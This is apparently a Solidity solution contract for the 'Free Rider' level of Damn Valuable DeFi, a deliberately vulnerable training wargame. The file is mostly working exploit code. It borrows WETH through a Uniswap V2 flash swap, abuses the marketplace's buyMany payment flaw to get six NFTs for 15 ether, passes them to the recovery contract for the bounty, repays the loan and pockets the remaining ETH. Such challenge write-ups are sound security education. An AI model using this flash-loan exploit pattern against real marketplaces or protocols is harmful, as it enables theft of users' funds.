// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableNFT.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import "./FreeRiderRecovery.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";


interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IERC20 {
    function transfer(address recipient, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract FreeRiderLoan is IUniswapV2Callee {

    address payable owner;

    address token;
    address weth;

    uint256[] tokenIds;

    IUniswapV2Factory factory;
    IWETH WethContract;
    IUniswapV2Pair pair;

    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery recovery;
    DamnValuableNFT nft;

    constructor(address uniswapFactory, address _weth, address _token, address _marketplace, address _recovery, DamnValuableNFT _nft, address _pair) {
        owner = payable(msg.sender);

        factory = IUniswapV2Factory(uniswapFactory);
        WethContract = IWETH(_weth);
        token = _token;
        nft = _nft;

        pair = IUniswapV2Pair(_pair);

        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        recovery = FreeRiderRecovery(_recovery);

        tokenIds.push(0);
        tokenIds.push(1);
        tokenIds.push(2);
        tokenIds.push(3);
        tokenIds.push(4);
        tokenIds.push(5);
    }

    function flashSwap(uint wethAmount) external {
        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(msg.sender);

        // amount0Out is DAI, amount1Out is WETH
        pair.swap(wethAmount, 0, address(this), data);
    }

    // This function is called by the DAI/WETH pair contract
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        (address caller) = abi.decode(data, (address));

        WethContract.withdraw(amount0);

        marketplace.buyMany{value: 15 ether}(tokenIds);

        nft.safeTransferFrom(address(this), address(recovery), 0, data);
        nft.safeTransferFrom(address(this), address(recovery), 1, data);
        nft.safeTransferFrom(address(this), address(recovery), 2, data);
        nft.safeTransferFrom(address(this), address(recovery), 3, data);
        nft.safeTransferFrom(address(this), address(recovery), 4, data);
        nft.safeTransferFrom(address(this), address(recovery), 5, data);

        // about 0.3% fee, +1 to round up
        uint fee = (amount0 * 3) / 997 + 1;
        uint256 amountToRepay = amount0 + fee;

        WethContract.deposit{value: amountToRepay}();

        // Transfer flash swap fee from caller
        WethContract.transfer(address(pair), amountToRepay);

        owner.transfer(address(this).balance);
    }

    receive() external payable {

    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}